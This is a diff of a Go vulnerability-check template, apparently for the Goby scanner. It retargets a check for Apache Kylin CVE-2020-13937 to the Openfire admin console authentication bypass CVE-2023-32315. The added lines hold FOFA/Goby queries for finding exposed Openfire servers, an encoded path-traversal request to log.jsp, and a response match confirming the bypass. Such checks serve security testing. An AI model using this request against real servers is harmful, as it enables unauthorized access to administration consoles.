@@ -6,14 +6,14 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "Apache Kylin config 未授权配置泄露 CVE-2020-13937",
+  "Name": "Openfire Administration Console 权限绕过漏洞 CVE-2023-32315",
   "Description": "",
   "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
   "Author": "清晨",
-  "FofaQuery": "app=\"APACHE-kylin\" || product=\"APACHE-kylin\" || title=\"kylin\"",
-  "GobyQuery": "app=\"APACHE-kylin\" || product=\"APACHE-kylin\" || title=\"kylin\"",
+  "FofaQuery": "app=\"Openfire-管理界面\" || body=\"Openfire\" || product=\"Openfire-管理界面\"",
+  "GobyQuery": "app=\"Openfire-管理界面\" || body=\"Openfire\" || product=\"Openfire-管理界面\"",
   "Level": "2",
   "Impact": "",
   "Recommendation": "",
@@ -30,7 +30,7 @@ func init() {
     {
       "Request": {
         "method": "GET",
-        "uri": "/kylin/api/admin/config",
+        "uri": "/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp",
         "follow_redirect": true,
         "header": {},
         "data_type": "text",
@@ -51,7 +51,7 @@ func init() {
             "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "kylin.metadata.",
+            "value": "org.jivesoftware.openfire.filetransfer.proxy.ProxyConnectionManager",
             "bz": ""
           }
         ]
@@ -107,7 +107,7 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "Apache Kylin config 未授权配置泄露 CVE-2020-13937",
+      "Name": "Openfire Administration Console 权限绕过漏洞 CVE-2023-32315",
       "Product": "",
       "Description": "",
       "Recommendation": "",
@@ -116,7 +116,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "Apache Kylin config Unauthorized Configuration Disclosure CVE-2020-13937",
+      "Name": "Administration Console authentication bypass CVE-2023-32315",
       "Product": "",
       "Description": "",
       "Recommendation": "",
